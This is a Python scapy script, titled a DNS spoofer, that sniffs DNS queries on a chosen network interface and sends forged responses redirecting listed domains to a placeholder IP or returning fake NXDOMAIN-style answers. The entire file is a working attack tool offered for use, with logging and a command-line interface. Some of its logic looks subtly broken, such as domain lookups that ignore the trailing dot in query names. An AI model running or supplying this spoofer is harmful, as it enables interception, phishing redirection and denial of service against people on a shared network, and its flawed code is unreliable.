import scapy.all as scapy
import threading
import time
import logging
import argparse
from datetime import datetime
import random

# Configure logging
logging.basicConfig(filename='dns_spoofer.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global variable for mapping of domain names to spoofed IP addresses
dns_mappings = {
    "example.com": "YOUR_SPOOFED_IP",
    "test.com": "YOUR_SPOOFED_IP",
    # Add more domain mappings as needed
}

def spoof_dns(pkt):
    if pkt.haslayer(scapy.DNSQR):
        # Extract the domain name from the DNS query
        requested_domain = pkt[scapy.DNSQR].qname.decode()

        # Check if the requested domain is in the mapping
        if requested_domain in dns_mappings:
            # Randomly select a response type (authoritative/non-authoritative/NXDOMAIN)
            response_type = random.choice(["authoritative", "non-authoritative", "NXDOMAIN"])
            
            if response_type == "authoritative":
                # Spoof an authoritative DNS response
                spoofed_response = scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst)/ \
                                   scapy.UDP(dport=pkt[scapy.UDP].sport, sport=pkt[scapy.UDP].dport)/ \
                                   scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=1, qd=pkt[scapy.DNS].qd,
                                             an=scapy.DNSRR(rrname=pkt[scapy.DNS].qd.qname, ttl=10, rdata=dns_mappings[requested_domain]))
            elif response_type == "non-authoritative":
                # Spoof a non-authoritative DNS response
                spoofed_response = scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst)/ \
                                   scapy.UDP(dport=pkt[scapy.UDP].sport, sport=pkt[scapy.UDP].dport)/ \
                                   scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=0, qd=pkt[scapy.DNS].qd,
                                             an=scapy.DNSRR(rrname=pkt[scapy.DNS].qd.qname, ttl=10, rdata=dns_mappings[requested_domain]))
            else: # response_type == "NXDOMAIN"
                # Spoof an NXDOMAIN response
                spoofed_response = scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst)/ \
                                   scapy.UDP(dport=pkt[scapy.UDP].sport, sport=pkt[scapy.UDP].dport)/ \
                                   scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=1, qd=pkt[scapy.DNS].qd,
                                             an=scapy.DNSRR(rrname=pkt[scapy.DNS].qd.qname, ttl=0))

            # Send the spoofed DNS response
            scapy.send(spoofed_response, verbose=False)

def start_sniffing(interface):
    logging.info("Starting DNS spoofing on interface: %s", interface)
    scapy.sniff(iface=interface, filter="udp port 53", prn=spoof_dns)

def parse_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofer")
    parser.add_argument("-i", "--interface", metavar="interface", required=True, help="Network interface to spoof DNS responses on")
    return parser.parse_args()

args = parse_arguments()

# Start DNS spoofing on a separate thread
spoofing_thread = threading.Thread(target=start_sniffing, args=(args.interface,))
spoofing_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    logging.info("Keyboard interrupt detected. Stopping DNS spoofing.")
    print("\n[!] Keyboard interrupt detected. Stopping DNS spoofing.")
    spoofing_thread.join()
    print("[+] DNS spoofing stopped.")
